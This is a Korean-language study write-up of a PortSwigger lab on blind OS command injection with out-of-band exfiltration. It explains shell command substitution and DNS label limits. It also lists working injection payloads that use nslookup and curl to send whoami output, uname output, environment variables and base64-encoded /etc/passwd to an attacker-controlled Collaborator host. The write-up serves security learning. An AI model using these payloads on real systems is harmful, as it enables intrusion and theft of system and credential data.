# Lab: Blind OS command injection with out-of-band data exfiltration

## 개요

- **난이도**: Practitioner
- **주제**: OS Command Injection — Blind / OOB 데이터 추출 / 명령 치환
- **링크**: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

## 목표

OOB DNS 조회에 명령 치환(Command Substitution)을 결합해 `whoami` 실행 결과를 외부 서버로 추출한다.

## 이전 랩(004)과의 차이

```
[004 — OOB 존재 탐지]
  nslookup COLLABORATOR
  → DNS 조회 수신 = 명령 실행 확인
  → 결과 데이터는 알 수 없음

[005 (이번) — OOB 데이터 추출]
  nslookup `whoami`.COLLABORATOR
  → whoami 결과를 DNS 서브도메인에 포함
  → DNS 조회 수신 시 서브도메인에 데이터가 담겨 있음
```

## 핵심 기법 — 명령 치환 (Command Substitution)

```bash
# 백틱 형식
`whoami`
→ 쉘이 whoami 를 먼저 실행하고 결과 문자열로 치환

# $() 형식 (중첩 가능)
$(whoami)
→ 백틱과 동일, 중첩 지원

# 예시
echo `whoami`       → echo peter        → 출력: peter
echo $(whoami)      → echo peter        → 출력: peter

nslookup `whoami`.xxxx.oastify.com
→ nslookup peter.xxxx.oastify.com   ← DNS 서브도메인에 실행 결과 포함
```

## 공격 흐름

```
[공격자]                [취약한 서버]                 [Burp Collaborator]
    │                        │                               │
    │── email=||nslookup──▶  │                               │
    │    `whoami`.X||         │── 1. whoami 실행 → "peter"    │
    │                        │── 2. nslookup peter.X ───────▶│
    │                        │                               │ DNS 쿼리 수신:
    │                        │                               │ peter.xxxx.oastify.com
    │◀── HTTP 200             │                               │
    │                        │                               │
    └── Collaborator 확인: DNS 조회 서브도메인 = "peter" ──────┘
```

## 공격 페이로드

```
email=x||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

URL 인코딩 (백틱 포함):
```
email=x%7c%7cnslookup+%60whoami%60.xxxx.oastify.com%7c%7c
```

서버에서 실행:
```bash
process_feedback ... x||nslookup `whoami`.xxxx.oastify.com|| {subject}
#  1. `whoami` 실행 → "peter-gBxxxx"
#  2. nslookup peter-gBxxxx.xxxx.oastify.com
#  3. DNS 조회 → Collaborator 수신
```

Burp Collaborator 에서 확인:
```
DNS query from SERVER-IP
Type: A
Name: peter-gBxxxx.xxxx.oastify.com
       ↑
   whoami 결과
```

## 다양한 데이터 추출 페이로드

```bash
# 현재 사용자
||nslookup+`whoami`.COLLABORATOR||

# OS 정보
||nslookup+`uname+-a | tr ' ' '-'`.COLLABORATOR||

# /etc/passwd 첫 줄 (base64 인코딩으로 특수문자 처리)
||nslookup+`cat /etc/passwd | head -1 | base64 | tr -d '='`.COLLABORATOR||

# 환경변수
||nslookup+`printenv HOME | tr '/' '-'`.COLLABORATOR||

# curl 로 HTTP 전송 (더 많은 데이터 가능)
||curl+http://COLLABORATOR/$(whoami)||
||curl+http://COLLABORATOR/$(cat /etc/passwd | base64)||
```

## DNS 서브도메인 제약과 처리

DNS 서브도메인에는 제약이 있어 명령 결과를 그대로 넣으면 조회 실패 가능:

```
[제약]
  - 레이블(점으로 구분된 각 부분) 최대 63자
  - 허용 문자: 알파벳, 숫자, 하이픈
  - 공백, 슬래시, 특수문자 불허

[우회]
  공백 → tr ' ' '-'  로 하이픈 치환
  슬래시 → tr '/' '-'
  긴 출력 → head -c 50 으로 잘라내기
  특수문자 → base64 인코딩 후 전송
    base64 결과도 = 포함 → tr -d '=' 으로 제거
```

## 004 vs 005 비교

| 항목 | 004 (존재 탐지) | 005 (데이터 추출) |
|------|---------------|-----------------|
| 목표 | 취약점 존재 확인 | 실제 데이터 획득 |
| 페이로드 | `nslookup DOMAIN` | `nslookup \`cmd\`.DOMAIN` |
| 명령 치환 | 불필요 | 필수 (`\`cmd\`` 또는 `$(cmd)`) |
| Collaborator 확인 내용 | DNS 조회 수신 여부 | DNS 서브도메인에 포함된 명령 결과 |

## 핵심 정리

- OOB 데이터 추출은 명령 치환(`` `cmd` `` 또는 `$(cmd)`)으로 명령 결과를 DNS 서브도메인에 포함시키는 방식이다.
- `nslookup \`whoami\`.COLLABORATOR` → 서버가 whoami 를 실행한 결과를 서브도메인으로 DNS 조회 → Collaborator 에서 수신.
- DNS 서브도메인 제약(63자, 영숫자+하이픈)으로 인해 공백·특수문자는 `tr` 로 치환하거나 base64 인코딩이 필요하다.
- 더 많은 데이터를 추출할 때는 DNS 대신 `curl http://COLLABORATOR/$(cmd)` 로 HTTP 채널을 사용한다.

## 배운 점

### OOB 데이터 추출 단계 정리

```
1. 취약점 탐지 (004)
   nslookup COLLABORATOR
   → DNS 수신 확인 → 취약점 존재

2. 데이터 추출 (이번 랩)
   nslookup `whoami`.COLLABORATOR
   → DNS 서브도메인에 결과 포함

3. 대용량 데이터 추출
   curl http://COLLABORATOR/$(cat /etc/passwd | base64)
   → HTTP 요청 본문 또는 경로로 전송
   → DNS 63자 제약 없음
```
